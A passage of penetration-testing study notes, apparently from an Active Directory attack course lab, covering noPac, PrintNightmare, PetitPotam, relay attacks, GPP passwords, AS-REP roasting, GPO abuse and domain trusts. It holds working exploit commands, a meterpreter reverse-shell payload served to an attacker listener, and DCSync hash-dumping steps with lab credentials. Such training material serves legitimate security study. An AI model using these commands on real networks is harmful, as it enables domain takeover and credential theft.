            ```
        
        2. if we are using the ```Enter-PSSession``` cmdlet or if we do not have option to pass creds with every tool/command, we can register a new session config using ```Register-PSSessionConfiguration```:

            ```ps
            # this method can be used if we have GUI access to a Windows-host

            Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
            # establish a WinRM session

            Import-Module .\PowerView.ps1

            get-domainuser -spn | select samaccountname
            # this fails due to the double hop problem

            exit

            # register new session config
            Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
            # this would not work in evil-winrm as it needs creds in pop-up

            Restart-Service WinRM
            # restart winRM service in current session

            # start a new PSSession
            Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess

            Import-Module .\PowerView.ps1

            get-domainuser -spn | select samaccountname
            # this works now, without having to pass creds in every command
            ```

* Bleeding edge vulnerabilities:

    * NoPac (SamAccountName spoofing):

        * covers vulnerabilities CVE-2021-42278 & CVE-2021-42287, allowing for intra-domain privesc from standard domain user to domain admin

        * the exploit takes advantage of [being able to change the 'SamAccountName' of a computer account to that of a DC](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware); we can use [this tool](https://github.com/Ridter/noPac):

            ```sh
            # in attacker machine
            # the 'noPac' exploit requires impacket tools

            sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
            # 'scanner.py' to check if the target is vulnerable

            sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
            # running exploit to get shell as SYSTEM
            # as part of the attack, it also saves the TGT (.ccache) file

            sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
            # NoPac exploit for dcsync attack - this gives us the hashes

            # if Windows Defender or any AV is enabled, the attack might work but shell commands would fail
            ```
    
    * PrintNightmare:

        * covers CVE-2021-34527 & CVE-2021-1675, found in the Print Spooler service running on all Windows OS

        * there are multiple versions of this exploit; the one used in this case requires a custom impacket install:

            ```sh
            # install exploit and impacket tools

            git clone https://github.com/cube0x0/CVE-2021-1675.git

            pip3 uninstall impacket
            git clone https://github.com/cube0x0/impacket
            cd impacket
            python3 ./setup.py install

            # check if the print services are exposed on target
            rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

            # craft DLL payload
            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

            # host this payload in SMB share
            sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

            # start listening in msfconsole

            msfconsole -q
            use exploit/multi/handler
            set PAYLOAD windows/x64/meterpreter/reverse_tcp
            set LHOST 172.16.5.225
            set LPORT 8080
            run

            # run the exploit with the malicious share+payload
            sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
            # this gives us an elevated shell on our listener
            ```
    
    * PetitPotam (MS-EFSRPC):

        * LSA spoofing vuln, covered in CVE-2021-36942, and abuses the MS-EFSRPC (Microsoft Encrypting File System Remote Protocol) functionality:

            ```sh
            # start ntlmrelayx
            sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
            # specify web enrollment URL for CA host
            # using either kerberos auth or AD CS template

            # if we do not know CA location, we can use a tool like 'certi'

            # in another window, run the PetitPotam exploit

            python3 PetitPotam.py 172.16.5.225 172.16.5.5
            # where .225 is attacker and .5 is the DC

            # if the attack works, in the ntlmrelayx window, we get the base64 encoded cert for the DC

            # using the 'gettgtpkinit.py' tool and the base64 certificate, we can request a TGT for DC
            python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64-certificate-string> dc01.ccache

            # set the env variable to this TGT
            export KRB5CCNAME=dc01.ccache

            # use DC TGT to DCsync
            impacket-secretsdump -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
            # this gives admin hash

            # alternatively, once we have the TGT file, we can also use 'getnthash.py' tool
            # to submit a TGS request
            python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
            # key taken from output of 'gettgtkpinit.py'
            # this gives us the NT hash

            impacket-secretsdump -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
            # using DC NT hash for DCsync attack
            ```

            ```ps
            # alternatively, once we have the base64 cert from ntlmrelayx
            # we can use Rubeus on Windows machine to get a TGT ticket, and perform PTT attack

            .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<base64-cert-string> /ptt

            klist
            # confirm the ticket is in memory

            # dcsync attack using mimikatz
            .\mimikatz.exe

            lsadump::dcsync /user:inlanefreight\krbtgt
            ```

* Miscellaneous misconfigurations:

    * Exchange-related group membership:

        * in an AD env, [certain groups related to Microsoft Exchange are granted high privileges](https://github.com/gdedrouas/Exchange-AD-Privesc)

        * members of 'Exchange Windows Permissions' can write a DACL to the domain object - this can be leveraged to give a user DCSync rights

        * the Exchange group 'Organization Management' can access mailboxes of all domain users; this group also has full control of the OU 'Microsoft Exchange Security Groups'
    
    * PrivExchange:

        * the 'PushSubscription' feature in the Exchange Server is flawed, due to which any domain user with a mailbox can force the Exchange Server to authenticate to any host provided by client over HTTP

        * this can be leveraged to relay to LDAP and dump the domain NTDS DB
    
    * printer bug:

        * this exploits a flaw in the MS-RPRN protocol (Print System Remote Protocol) - any domain user can connect to the printer spool's named pipe with the 'RpcOpenPrinter' method and use the 'RpcRemoteFindFirstPrinterChangeNotificationEx' method to force the server to authenticate to any host provided by client over SMB

        * the spooler service runs as SYSTEM by default; this attack can be leveraged to relay to LDAP and grant DCsync or RBCD privileges for privesc

        * we can check if the machine is vulnerable to the MS-PRN bug using [this tool](https://github.com/NotMedic/NetNTLMtoSilverTicket):

            ```ps
            Import-Module .\Get-SpoolStatus.ps1

            Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
            ```
    
    * MS14-068:

        * this was a flaw in the Kerberos protocol,  and it allowed a forged PAC to be accepted by the KDC as legit

        * this can be exploited using tools like [pykek](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or ```impacket```
    
    * sniffing LDAP creds:

        * many apps & printers store LDAP creds in their web admin console to connect to the domain; sometimes the apps have a 'test connection' feature that can be abused by changing the LDAP IP address to our attacker

        * when the device attempts to test the LDAP connection, it sends the creds to the attacker, often in cleartext
    
    * enumerating DNS records:

        * we can use tools like [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in an AD setup using a valid domain user; this is helpful in cases where AD machines have non-descriptive names:

            ```sh
            adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
            # this generates a csv file with records

            less records.csv
            # there are some unknown entries, we can run the tool recursively now

            adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
            # this resolves all records
            ```
    
    * password in Description field:

        * sometimes, sensitive info can be found in user account Description or Notes fields:

            ```ps
            Import-Module .\PowerView.ps1

            Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
            ```
    
    * PASSWD_NOTREQD field:

        * if the 'PASSWD_NOTREQD' field is set in the 'userAccountControl' attribute for any domain account, the user is not subject to current password policy length

        * this means the user could have a shorter password or no password at all:

            ```ps
            Import-Module .\PowerView.ps1

            Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
            ```
    
    * creds in SMB shares & SYSVOL scripts:

        ```ps
        ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
        # check for SYSVOL scripts

        # this includes a .vbs file
        cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
        ```
    
    * GPP (Group Policy Preferences) passwords:

        * when a new GPP is created, an .xml file is created in the SYSVOL share, and also cached locally on endpoints that the policy applies to

        * these files contain config data & defined passwords; the 'cpassword' attribute value is important, as it can be decrypted:

            ```sh
            # if we have the cpassword value from the xml file, it can be cracked
            gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
            ```
        
        * GPP passwords can be found by checking SYSVOL share manually or using tools like [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) or ```crackmapexec``` - if a password is decrypted, it can be checked for password re-use:

            ```sh
            # in cases where AutoLogon is configured via GPP using 'Registry.xml'
            # any domain user can fetch creds from this file
            crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
            ```
    
    * ASREProasting:

        * if an account has the 'Do not require Kerberos pre-authentication' setting enabled, an attacker can request and fetch an encrypted TGT from the DC, and crack it offline (similar to kerberoasting, except that AS-REP is attacked here instead of TGS-REP):

            ```ps
            Import-Module .\PowerView.ps1

            Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
            # enumerate for domain users vulnerable to ASREProasting

            # Rubeus can be used to retrieve the ASREP hash
            .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
            ```

            ```sh
            # crack ASREP hash
            hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
            ```

            ```sh
            # alternatively, AS-REP can be fetched from attacker
            
            # using kerbrute
            kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

            # using Get-NPUsers.py
            impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
            ```
    
    * GPO (Group Policy Object) abuse:

        * GPO misconfigs can be abused for attacks like adding extra rights to a user, adding a local admin user to hosts, creating an immediate scheduled task, etc.:

            ```ps
            Import-Module .\PowerView.ps1

            # enumerate GPO names
            Get-DomainGPO | select displayname

            # enumerate GPO names with built-in cmdlet from Group Policy Management tools
            Get-GPO -All | select displayname

            # check if a user we can control has any rights over a GPO

            # check entire 'Domain Users' group first
            $sid=Convert-NameToSid "Domain Users"

            Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
            # this shows we have several permissions like 'WriteProperty' and 'WriteDacl' over a GPO
            
            # get GPO name from GUID in previous output
            Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
            ```
        
        * ```bloodhound``` can also be used for GPO enumeration, abuse vectors, and which OU/machines the GPO is applied to; tools like [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) can be used for attacks

## Attacking domain trusts

* Domain trusts:

    * trust - used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in another domain
    
    * trusts create links between authentication systems of domains, and can allow one-way or two-way communication

    * transitive trust - trust is extended to objects that the child domain trusts
    
    * non-transitive trust - child domain itself is the only one trusted

    * types of trusts:

        * parent-child - domains within same forest; child domain has a two-way (bidirectional) transitive trust with parent domain (e.g. - users in child domain 'corp.inlanefreight.local' could authenticate into parent domain 'inlanefreight.local', and vice-versa)
        * cross-link - trust between child domains to speed up authentication
        * external - non-transitive trust between separate domains in separate forests, which are not already joined by a forest trust
        * tree-root - two-way transitive trust between a forest root domain and a new tree root domain
        * forest - transitive trust between two forest root domains
        * ESAE (enhanced security administrative environment) - bastion forest to manage AD; used only for admin & management tasks for AD
    
    * enumerating trust relationships (in ```bloodhound```, we can use 'Map Domain Trusts' query for this info):

        ```ps
        Import-Module activedirectory

        Get-ADTrust -Filter *
        # enumerate domain trust relationships

        Import-Module .\PowerView.ps1

        Get-DomainTrust
        # check existing trusts

        Get-DomainTrustMapping
        # check trust mapping

        Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
        # check users in a certain domain, in this case it is a child domain
        ```

        ```cmd
        netdom query /domain:inlanefreight.local trust
        # using netdom to check domain trusts

        netdom query /domain:inlanefreight.local dc
        # check DCs

        netdom query /domain:inlanefreight.local workstation
        # check servers
        ```

* Attacking domain trusts (Child -> Parent) from Windows:

* Attacking domain trusts (Child -> Parent) from Linux:

* Cross-forest trust abuse from Windows:

* Cross-forest trust abuse from Linux:

## Skills assessment
